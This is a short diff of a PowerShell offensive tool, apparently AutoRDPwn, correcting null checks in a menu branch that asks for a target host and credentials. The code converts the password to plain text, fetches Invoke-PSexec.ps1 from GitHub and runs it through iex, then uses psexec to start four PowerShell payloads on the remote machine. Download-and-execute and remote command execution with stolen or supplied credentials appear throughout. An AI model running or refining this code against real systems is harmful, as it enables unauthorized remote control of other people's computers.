@@ -226,19 +226,18 @@ if($Language -in 'Spanish') {
 
         '1' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine()
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
-	if($computer = $null) { $computer = 'localhost' }
-	if($user = $null) { .\psexec.exe \\$computer  -h -d powershell.exe "$Pwn1" -nobanner -accepteula
+	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn3" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn4" -nobanner -accepteula }
-	else { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn1" -nobanner -accepteula
+	if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn2" -nobanner -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn3" -nobanner -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn4" -nobanner -accepteula }
